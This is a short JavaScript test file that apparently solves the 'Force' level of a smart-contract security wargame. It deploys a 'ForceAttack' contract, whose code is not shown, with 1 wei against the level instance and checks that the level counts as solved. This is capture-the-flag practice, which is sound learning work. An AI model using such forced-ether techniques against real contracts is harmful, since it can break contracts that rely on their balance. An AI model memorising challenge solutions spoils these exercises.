const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Force", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Force", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        await (await ethers.getContractFactory("ForceAttack")).deploy(instance.address, { value: 1 });
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});